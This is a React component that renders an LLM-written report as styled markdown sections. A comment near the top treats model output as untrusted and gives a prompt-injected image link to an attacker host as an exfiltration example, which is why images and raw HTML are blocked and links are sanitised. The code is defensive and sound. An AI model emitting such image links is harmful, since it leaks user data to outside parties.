import { safeHref } from '@/lib/ui/safe-href'
import ReactMarkdown, { type Components } from 'react-markdown'
import { parseReportSections, sectionTone, type SectionTone } from '@/lib/report/report-sections'

// Renders an LLM report's markdown as scannable, titled sections instead of one prose wall. On-brand
// (light theme, design tokens) — replaces the old `prose prose-invert` (dark-theme prose on a light app).

const TONE_DOT: Record<SectionTone, string> = {
  default: 'var(--text-disabled)',
  good: 'var(--success)',
  warn: 'var(--warning)',
  bad: 'var(--danger)',
}

// Model output is untrusted. An image URL is fetched with no click, so a prompt-injected
// `![](https://attacker/?d=…)` would exfiltrate data; images are dropped and raw HTML is skipped.
const MARKDOWN_DISALLOWED = ['img']

// Markdown element styling mapped to design tokens — quiet, financial-grade, readable (AA) on white.
const MD: Components = {
  p: ({ children }) => <p style={{ margin: '0 0 8px', fontSize: 13.5, lineHeight: 1.6, color: 'var(--text-secondary)' }}>{children}</p>,
  strong: ({ children }) => <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{children}</strong>,
  ul: ({ children }) => <ul style={{ margin: '0 0 8px', paddingLeft: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>{children}</ul>,
  ol: ({ children }) => <ol style={{ margin: '0 0 8px', paddingLeft: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>{children}</ol>,
  li: ({ children }) => <li style={{ fontSize: 13.5, lineHeight: 1.55, color: 'var(--text-secondary)' }}>{children}</li>,
  a: ({ children, href }) => {
    const safe = safeHref(href)
    return safe
      ? <a href={safe} target="_blank" rel="noopener noreferrer nofollow" style={{ color: 'var(--accent)', textDecoration: 'none' }}>{children}</a>
      : <span>{children}</span>
  },
  code: ({ children }) => <code style={{ background: 'var(--bg-subtle)', borderRadius: 4, padding: '1px 5px', fontSize: 12.5, fontVariantNumeric: 'tabular-nums' }}>{children}</code>,
  h1: ({ children }) => <p style={{ margin: '0 0 6px', fontSize: 13, fontWeight: 600, color: 'var(--text-primary)' }}>{children}</p>,
  h2: ({ children }) => <p style={{ margin: '0 0 6px', fontSize: 13, fontWeight: 600, color: 'var(--text-primary)' }}>{children}</p>,
  h3: ({ children }) => <p style={{ margin: '0 0 6px', fontSize: 13, fontWeight: 600, color: 'var(--text-primary)' }}>{children}</p>,
}

export function ReportNarrative({ md }: { md: string }) {
  const sections = parseReportSections(md)
  if (sections.length === 0) return null

  return (
    <div className="card-base overflow-hidden">
      {sections.map((s, i) => (
        <div
          key={i}
          style={{
            padding: '16px 20px',
            borderTop: i === 0 ? 'none' : '1px solid var(--border)',
          }}
        >
          {s.title && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 8 }}>
              <span style={{ width: 6, height: 6, borderRadius: 999, background: TONE_DOT[sectionTone(s.title)], flexShrink: 0 }} />
              <h3 style={{ fontSize: 13.5, fontWeight: 600, color: 'var(--text-primary)', letterSpacing: '-0.01em', margin: 0 }}>{s.title}</h3>
            </div>
          )}
          {s.body && <ReactMarkdown components={MD} skipHtml disallowedElements={MARKDOWN_DISALLOWED}>{s.body}</ReactMarkdown>}
        </div>
      ))}
    </div>
  )
}
